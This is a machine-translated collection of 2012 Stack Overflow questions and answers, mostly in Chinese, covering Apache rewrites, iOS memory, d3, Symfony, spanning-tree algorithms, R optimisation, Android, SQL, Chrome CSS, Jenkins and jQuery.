另外，我可以使用 %{CONSTANT} 代替 example.com 来代表当前域吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:46:48.443

您要查找的常量*由* `%{HTTP_HOST}`HTTP 请求提供。也许您正在寻找 `%{SERVER_NAME}`虚拟主机默认服务器名的变量？

首先放置主机名检查规则，并`RewriteCond`在`page.php`规则中使用 a 仅在域已经正确时应用：

```
RewriteEngine On
# First rewrite the domain
RewriteCond %{HTTP_HOST} ^example\.com$
RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]

# Then rewrite the files
# At this point, the domain should already have been enforced
RewriteCond %{HTTP_HOST} ^www\.example\.com$
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-l
RewriteRule (?!^(cms|images|js|mobile)(/.*|)$)^.*$ page.php [NC,L] 
```

# ios - 从 NSArray 中删除对象

> ID：13125950
> 
> 赞同：14
> 
> 时间：2012-10-29T16:41:31.873
> 
> 标签：ios, nsmutablearray, nsarray, automatic-ref-counting, release

我有一个 ARC 项目。

我`NSArray`里面有一点东西。在某些时候，我需要更改数组中的对象。

我`NSMutableArray`会做的：

```
[array removeAllObjects]; 
```

我确信这个方法会释放数组中包含的所有对象。但是使用 NSArray 我不能那样做！所以，我的问题是：如果我将数组设置为`nil`然后重新初始化它，数组中包含的旧对象真的从内存中释放了吗？

```
array = nil;
array = [[NSArray alloc] initWithArray:newArray]; 
```

还是我需要使用`NSMutableArray`？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-10-29T16:55:32.670

你可以这样做：

```
array = newArray; 
```

这将导致`array`被释放。当它`NSArray`被释放时，所有包含的对象也将被释放。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-29T16:46:37.647

当不再有强引用时，旧数组将被释放。如果您对它有唯一的强引用，那么当您设置`array`为其他内容时，它将立即被释放。

当旧数组被释放时，它将释放它包含的所有对象。如果这些对象没有其他强引用，它们也将立即被释放。

您不必`array = nil`在将其设置为新数组之前进行设置。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T16:43:02.200

我会建议 NSMutableArray 因为不会再有分配和释放的开销

# d3.js - D3 中的过渡 - 复制气泡而不是过渡气泡

> ID：13125951
> 
> 赞同：1
> 
> 时间：2012-10-29T16:41:38.660
> 
> 标签：d3.js, transition, bubble-chart

我正在尝试创建类似于此示例的内容：[Wealth and Health of Nations](http://bost.ocks.org/mike/nations/)：

![在此处输入图像描述](../Images/856b1ec3eb32681a89e427dbfcd7bd43.png)

我的数据来自 JSON 文件，就像示例一样，但是当我添加转换时，我得到了重复的气泡。而不是气泡从 A 点过渡到 B 点，我得到 2 个气泡（一个用于 A 点，一个用于 B 点）。一般来说，转换无法区分同一气泡的 2 个数据点或 2 个单独的气泡。

看这个例子，我错过了 interpolate 和 bisect 函数。我无法理解它们是如何工作的，以及我到底做错了什么。这是导致我的图表出现问题的原因吗？

另外，有人可以给我一个关于平分线和插值如何在 d3 中工作的例子吗？

代码：

```
 g = d3.select("#animation")
                .append("svg")
                .attr("width", width)
                .attr("height", height);

      x_extent = [0, 100];
      x_scale = d3.scale.linear().domain(x_extent).range([margin + 20, width - 30]);

      y_extent = [0, 60];
      y_scale = d3.scale.linear().domain(y_extent).range([height - margin, margin]);

      r_scale = d3.scale.linear().domain([0, d3.max(jsondata, function (d) { return d.MSVMMboe; })]).range([2, 30]);

      g.selectAll("circle").data(jsondata, function (d) { return d.EffectiveDate; }).enter().append("circle")
                      .attr("cx", function (d) { return x_scale(d.PercentageComplete * 100) })
                      .attr("cy", function (d) { return y_scale(d.GPoS * 100) })
                      .attr("r", function (d) { return r_scale(d.MSVMMboe) })
                      .attr("stroke", "blue")
                      .attr("stroke-width", 1)
                      .attr("opacity", 0.6)
                      .attr("fill", "red");

                      //add transition

                      g.selectAll("circle").data(jsondata, function (d) { return d.EffectiveDate; })
                      .transition()
                      .duration(1000); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T09:19:00.687

你还没有告诉过渡你想要改变什么。例如，您需要添加一些属性更改。查看 d3 网站以获取示例和教程。

# service - 找不到 Symfony2 服务

> ID：13125952
> 
> 赞同：0
> 
> 时间：2012-10-29T16:41:39.690
> 
> 标签：service, symfony

我有一个自定义服务类：

```
namespace Acme\OpsBundle\Lib;

use Doctrine\ORM\EntityManager;
use Monolog\Logger;

class ProductManager
{
    private $m_logger;
    private $m_em;

    public function __construct(EntityManager $em, Logger $logger)
    {
        $this->m_logger = $logger;
        $this->m_em = $em;
    }

    ...
} 
```

在 config.yml 中定义为：

```
services:
    opsbundle.prod_manager:
        class: Acme\OpsBundle\Lib\ProductManager
        arguments: [@doctrine.orm.entity_manager, @monolog.logger] 
```

我通过以下方式在控制器中访问它：

```
$repoman = $this->get('opsbundle.prod_manager'); 
```

但我收到以下错误：

> 致命错误：在第 1555 行的 C:\apache\Symfony\app\cache\dev\appDevDebugProjectContainer.php 中找不到类 'Acme\OpsBundle\Lib\ProductManager'

这曾一度奏效，但我无法弄清楚从那以后发生了什么变化以打破它。我试过清除缓存并重新启动apache。

谁能建议为什么会发生这种情况？

# algorithm - 寻找最小瓶颈生成树

> ID：13125956
> 
> 赞同：2
> 
> 时间：2012-10-29T16:41:59.807
> 
> 标签：algorithm, tree, graph-theory, minimum-spanning-tree

嗨，我正在做一些测试准备，我需要弄清楚 b 和 c 部分。我知道 a 部分是正确的，我可以证明这一点，但是找到 b 和 c 部分的算法目前让我望而却步。

> 解决以下问题以获得最小瓶颈树，其中具有最大成本的边被称为瓶颈。(a) G 的每个最小瓶颈生成树都是 G 的最小生成树吗？证明你的主张。
> 
> (b) 对于给定的成本 c，给出一个 O(n+m) 时间的算法来找出 G 的最小瓶颈生成树的瓶颈成本是否不大于 c。
> 
> (c) 找到一种算法来找到 G 的最小瓶颈生成树。

提前感谢任何可以帮助我的人

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T17:08:54.320

对于*（b）*：

擦除**G**中花费超过**c**的每条边，然后检查左图是否仍然连接。

对于*(c)*：

对**c**进行二分搜索，使用求解 (b) 的算法作为划分条件。

*(b)*的证明：

假设我们从**G**中删除成本超过**c**的边后得到的图是**G'**。然后：

 ****1.  如果**G'**是连通的，那么**G** '中一定有生成树**T。**由于**G'**中没有边的成本超过**c**，我们可以确定**T**中没有边的成本超过**c**。因此**T是****G'**和**G**的生成树，其瓶颈至多为**c**
*******   如果**G'不连通，则****G** '中根本没有生成树。由于我们知道**G** - **G'**中的每条边都比**c花费更多，并且我们知道****G**的任何生成树都将包含**G** - **G'**的至少一条边，因此我们知道**G**的边生成树不存在瓶颈 < = **c********

 ****当然，检测一个图是否连接成本 O(n+m)

*(c)*的证明：

比如说，我们在*(b)*中使用的算法是**F(G,c)**。

然后我们有

如果**F(G,c)** = **True**对于某些**c**，则**F(G,c')** = **True**对于所有具有**c** **'>=c 的 c'**

如果**F(G,c)** = **False**对于某些**c**，则**F(G,c')** = **False**对于所有**c'**具有**c'<=c**

所以我们可以在**c**上进行二分搜索:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-15T05:42:45.010

```
Ans. a)False,every minimum bottleneck spanning tree of graph G is not a minimum spanning tree of G.

b)To check whether the value of minimum bottleneck spanning tree is atmost c,you can apply depth first search by selecting any vertex from the set of vertices in graph G.

***Algorithm:*** 

check_atmostvalue(Graph G,int c)
{

for each vertex v belongs to V[G] do {
visited[v]=false;
}

DFS(v,c); //v is any randomly choosen vertex in Graph G
for each vertex v belongs to V[G] do {
if(visited[v]==false) then
return false;
}
return true;
}

DFS(v,c)
{
visited[v]=true;

for each w adjacent to v do {
if(visited[w]=false and weight(v,w)<=c) then
DFS(w,c);
}
visited[w]=true;
}

This algorithm works in O(V+E) in the worst case as running timr for depth first search DFS is O(V+E). 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-11-05T02:39:04.707

这个问题可以通过简单地找到图的 MST 来解决。这基于以下声明：
MST 是连接图的 MBST。
对于一个 MST，选择 MST 中最大的边 e，边 e 将 MST 分成两个集合 S 和 T。那么从割性质来看，边 e 必须是连接 S 和 T 的那些边中的最小权重。
那么对于一个MBST，一定有一条边e'连接S和T。那么w(e')必须不小于w(e)。因此我们知道 MST 一定是一个 MBST。

但是，还有另一种方法可以确定最小瓶颈。我们不需要计算 MBST。在您的问题中，您实际上暗示了最小瓶颈的单调性。因此我们可以使用二分搜索结合连通性算法来找到最小瓶颈。我已经看到在其他情况下使用单一性。我有点惊讶，在这里可以使用类似的技术！********

# r - solve.QP 不能最大化正定二次函数

> ID：13125957
> 
> 赞同：1
> 
> 时间：2012-10-29T16:42:03.573
> 
> 标签：r, optimization, quadratic

我有一个非常简单的二次问题，原则上应该可以通过solve.QP（quadprog）解决：

`max x^2+3*y^2 subject to x>=0, y>=0, x+y <=1`

问题在于将最大化变为所需的最小化，矩阵（显然）变为负定的。这不是与小特征值或舍入有关的问题。

我认为solve.QP是一个通用求解器，但尽管我努力阅读在线资料，但看起来你无法使用solve.QP在紧凑域（由线性约束定义）上最大化正定二次形式。

真的吗？

我知道我可以用其他函数解决这个问题和类似问题（`constrOptim`工作正常），但我希望将拉格朗日乘数连接到最大化器。

您能否提出任何方法来解决上述问题（非常有效的）solve.QP，克服其与正确定性相关的不对称限制？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:52:34.880

您想在凸域上找到凸函数的最大值。凸函数在其域的内部点中不能有最大值，因此使用拉格朗日乘数的方法不能应用于该问题。

在您的情况下，域是一个紧凑的多边形，因此在其中一个顶点中假定最大值。这是一个微不足道的检查。

# android - fetchAll() 中的索引超出范围

> ID：13125967
> 
> 赞同：0
> 
> 时间：2012-10-29T16:42:26.163
> 
> 标签：android, android-sqlite

在 Android 中，我使用以下语句：

```
return bdd.rawQuery("SELECT * FROM " + TABLE_EVENTS , new String[]{"titre","emplacement"}); 
```

它抛出错误：

```
android.database.sqlite.SQLiteException: bind or column index out of range: handle 0x3e1360 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:45:39.957

如果不在查询的 WHERE 子句中`selectionArgs`使用相同数量的s，则无法使用该参数。`?`我猜你想要：

```
return bdd.rawQuery("SELECT titre, emplacement FROM " + TABLE_EVENTS, null); 
```

# android - 删除文本第一个字母之前的多余空格，以便它可以正确对齐到左侧

> ID：13125969
> 
> 赞同：4
> 
> 时间：2012-10-29T16:42:31.563
> 
> 标签：android, text, vertical-alignment

我有几个完全相同`TextView`的 s 垂直对齐（左侧相同的边距，左侧相同的填充，左侧相同的位置）。它们可以有不同的文本大小，并且文本可以以不同的字母开头。问题是，尽管`TextView`s 向左对齐，但其中的文本却不是。有可能实现这一目标吗？删除/分解每个第一个字母之前的额外空间？或者我应该寻找一些特定的字体？

下面的图片显示了这种情况。三个`TextView`s 向左对齐，但每个字母都从不同的点开始。*s*和*m*具有相同的大小，但未对齐。*我*相当小，差距更大。

我所看到的：
![实际的](../Images/bebf8da4a69ce9f5eb5c646231d79004.png)

我想要的是：
![预期结果（手动对齐）](../Images/3dd1dedb0d951170e58472a86f336dfe.png)

示例代码：

```
<RelativeLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="m"
        android:textColor="#88FF0000"
        android:textSize="250dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="s"
        android:textColor="#8800FF00"
        android:textSize="250dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="220dp"
        android:text="i"
        android:textColor="#880000FF"
        android:textSize="25dp" />
</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-08-18T11:26:01.427

虽然这个问题很老，但我只是遇到了同样的问题并找到了如下解决方案，也许它可以帮助其他人：

创建一个 TextView 子类并覆盖它的`onDraw()`方法，如下所示：

```
// bounds field to avoid allocations in onDraw()
Rect bounds = new Rect();

@Override
protected void onDraw(Canvas canvas) {
    getPaint().getTextBounds(getText().toString(), 0, getText().length(), bounds);
    canvas.translate(-bounds.left, 0);
    super.onDraw(canvas);
} 
```

**警告**：虽然我观察到文本边界有一个左值，该值对应于第一个字母之前的空像素数量，并且与`Paint#getTextBounds()`它返回的文档一致

> 包含所有字符的最小矩形，隐含原点位于 (0,0)，

因此左侧值是实际文本的开始位置，此修复可能不适用于所有字体或配置。

还需要注意的是，这是左对齐单行文本的简单解决方案；多行或滚动文本将需要进一步调整，否则可能根本无法使用。

# tsql - 将附加文本转换为日期

> ID：13125970
> 
> 赞同：-5
> 
> 时间：2012-10-29T16:42:32.477
> 
> 标签：tsql

```
 convert(datetime,  BIRTH_MM + '/' +  BIRTH_DD + '/' + BIRTH_YY, 103) as Birthdate 
```

所以连接的字符串如下所示：`04/05/88`

试图让这个工作。

试过这个，关闭我现在得到一个日期，但它给了我 1900 年或 1905 年，这是不对的

```
convert(datetime,  BIRTH_MM + BIRTH_DD + BIRTH_YY, 103) as Birthdate 
```

更新

尝试了一些东西，但还没有：

```
 case when(BIRTH_DD > 0 and BIRTH_MM > 0 and BIRTH_YY > 0)
    then 
            convert(datetime, cast(BIRTH_DD as varchar(1)) + '/' + cast(_BIRTH_MM as varchar(2)) + '/' + cast(BIRTH_YY as varchar(4)), 103)
    else
            convert(datetime, '1900-01-01', 103) as Birthdate,
        end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:54:10.910

在没有看到这些值的表结构或数据类型的情况下，您可以使用类似于以下内容的内容：

```
declare @BIRTH_MM int = 04
declare @BIRTH_DD int = 05
declare @BIRTH_YY int = 1988

select convert(datetime,
               cast(@BIRTH_MM as varchar(2)) + '/' +  
               cast(@BIRTH_DD as varchar(2)) + '/' + 
               cast(@BIRTH_YY as varchar(4)), 101) as Birthdate 
```

见[SQL Fiddle with Demo](http://sqlfiddle.com/#!3/d41d8/5606)

# javascript - Chrome 背景图像修复了重绘问题

> ID：13125976
> 
> 赞同：0
> 
> 时间：2012-10-29T16:42:49.143
> 
> 标签：javascript, jquery, css, google-chrome

对于我目前正在开发的网站。我试图在页面上为背景图像提供一种视差效果。基本上我有一个具有设定高度的 div，当用户单击每个旋转器项目时，我正在更新 div 的背景图像。背景图像固定在顶部中心，当页面首次加载时它工作得非常好。但是，如果您稍微向下滚动以使部分 div 不可见并在旋转器中切换项目，则背景图像仅在 div 的某个点加载，但只要我滚动或触摸检查器中的任何元素，它就会完全加载。

这是我的标记，以防我做错了什么，但它在 Firefox 和 IE7/8/9 中运行良好，但在 Chrome 中运行良好。任何帮助将非常感激。

```
.home .rotator
{
    height:450px;
    background: fixed center top no-repeat;
    background-size: 100% auto;
    position: relative;
    margin-bottom: 20px;
}

$(".home .rotator").css("background-image", "url('" + bgImg + "')"); 
```

如果您需要任何进一步的信息，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-01-12T15:45:05.673

最终解决了问题，而不是背景：固定中心顶部不重复；删除了固定并使用背景附件：固定；

# sql - SQL IF 语句不会执行

> ID：13125982
> 
> 赞同：-4
> 
> 时间：2012-10-29T16:43:18.973
> 
> 标签：sql

我不知道 SQL，而且我无法找到我需要做的示例。

`isGuest`如果条目的列是，我有一个要从中删除的表`1`。然后我从引用该条目的其他表中删除。

作为 C++ 开发人员，我基本上想做一个 if 检查以查看给定帐户（用 an 选择`accountID`）是否具有`isGuest`of `0`，如果是则从函数返回（跳过删除）。

如果我尝试这个，我会得到一个

> *无效的列名“isGuest”*

错误。我知道表名和列名是正确的，所以我很茫然。根据我已经看到的一些令人困惑的论坛帖子，我开始担心 SQL 不能真正做我想做的事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T17:21:03.953

如果您使用的是 MySql，我相信您可以在单个语句中[`DELETE`从多个表中获取，例如：](http://www.tutorialsolve.com/2009/08/02/mysql-delete-statement-across-multiple-tables-tutorial/)

```
DELETE T1, T2, T3
FROM table1 T1
    LEFT JOIN table2 T2 ON T1.Id = T2.Id -- Or whatever links your main table to others
    LEFT JOIN table3 T3 ON T1.Id = T3.Id
WHERE T1.isGuest = 0 -- Filter the records you want to delete.  This is what you were trying the accomplish with IF(isGuest = 0) 
```

否则，您需要将要删除的记录的 ID 输出到临时表中，并使用它从其他表中删除。 [这个问题](https://stackoverflow.com/questions/783726/how-do-i-delete-from-multiple-tables-using-inner-join-in-sql-server)给出了很好的解释。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-29T17:20:18.720

```
DECLARE @guest bit;

SELECT 
  CASE isGuest
    WHEN 0 THEN @guest = 0
    ELSE @guest =1
  END As GuestYesNo
FROM 
   dbo.Account
WHERE
  AccountID = @AccountID;

IF @Guest = 0
BEGIN
  -- DoStuff;
END 
ELSE
  -- DoOtherStuff; 
```

[CASE 语句](http://msdn.microsoft.com/en-us/library/ms181765.aspx) [IF..ELSE 语句](http://msdn.microsoft.com/en-us/library/ms182717.aspx)

# jenkins - 詹金斯墙展示 404

> ID：13125992
> 
> 赞同：3
> 
> 时间：2012-10-29T16:43:59.460
> 
> 标签：jenkins, hudson, jenkins-plugins

我启用了 Jenkins Wall 显示插件，但是当我单击链接时，我得到一个 404。图标本身也找不到。

查看墙展示的链接是这样的：

[http://ci.mysite.com//plugin/jenkinswalldisplay/walldisplay.html?viewName=All&jenkinsUrl=http%3A%2F%2Fci.mysite.com%2F](http://ci.mysite.com//plugin/jenkinswalldisplay/walldisplay.html?viewName=All&jenkinsUrl=http%3A%2F%2Fci.mysite.com%2F)

有谁知道我怎样才能让它工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T06:29:44.623

在我的 Jenkins 安装 (1.473) 中的可用插件列表中有两个名为“Wall Display Plugin”的插件。

在安装带有 version 的版本时，我遇到了与您完全相同的问题`0.6.2`，但 version`0.6.15`有效。[Wall Display Plugin](https://wiki.jenkins-ci.org/display/JENKINS/Wall+Display+Plugin)的插件页面上没有提到 0.6.2 版本。

# android - 保持应用程序状态 - 部署/安装 apk

> ID：13125994
> 
> 赞同：0
> 
> 时间：2012-10-29T16:44:06.920
> 
> 标签：android, state

我试图让我的应用程序在暂停时最小化，然后当它恢复时，它应该恢复到以前的状态，而不是重新创建。当从 Eclipse 将应用程序部署到设备/模拟器上时，这非常有效。

当我获得 apk（从 bin\ 或从 Project -> Android 工具 -> 导出签名的应用程序包）并将其安装在具有文件浏览器 (Astro) 的设备上时出现问题：应用程序在暂停时被破坏然后重新创建.

我可以调用**moveTaskToBack(true);** 在我的活动中，但在启动时仍会重新创建它。

围绕此的所有讨论都基于实现相反的目的：在最小化应用程序时关闭应用程序。有什么方法可以实现我想要的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:58:00.690

> 我试图让我的应用程序在暂停时最小化，然后当它恢复时，它应该恢复到以前的状态，而不是重新创建。

这是短暂停期的正常行为，假设“暂停”是指“用户通过 HOME、最近的任务等进入另一个应用程序”，并假设“最小化”是指“进入后台”。

关键是“短暂停期”。Android 最终会终止您的后台进程，要么自行为其他进程释放 RAM，要么应用户请求（例如，从最近的任务中滑动）。“最终”有多长取决于许多因素，这些因素都不是你能控制的。

因此，您别无选择，只能同时处理“最小化和恢复”和“最小化和终止”两种情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:50:23.587

如果您按下`back`按钮，您的应用程序将被关闭`onDestroy()`并被调用。这是有意的行为。如果你按下`Home`按钮，只`onPause()`应该被调用。如果您按下后退按钮，我想不出任何方法来防止应用程序关闭。

# jquery - How to get the position of an element using .offset()

> ID：13125996
> 
> 赞同：0
> 
> 时间：2012-10-29T16:44:13.510
> 
> 标签：jquery, position, offset

I have a table with a menu hidden in a cell that that I expand using `slideToggle()`. This menu has a few `<img>` that `onclick=` call a function and passed the element and a number. Now I'm trying to get the position of the element that made the call so I can dynamically create an overlay `<div>`. The problem is that I am not getting the position values and I don't know why. [HERE](http://jsfiddle.net/gRfnb/17/) is a small example of what I am trying to do. Can anyone help?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T17:03:28.770

I believe the issue is your use of $(this). You are passing the element that was clicked into your function so you need to use that instead. I have also updated your alert to explicitly output the left offset as offset would just return an object. You could instead use console.log to be able to inspect the returned object (in a browser like chrome):

```
window.somefunc = function(el,id){
    var pos = $(el).offset();
    alert(pos.left);
} 
```

I have updated your JSFiddle here: [http://jsfiddle.net/gRfnb/22/](http://jsfiddle.net/gRfnb/22/)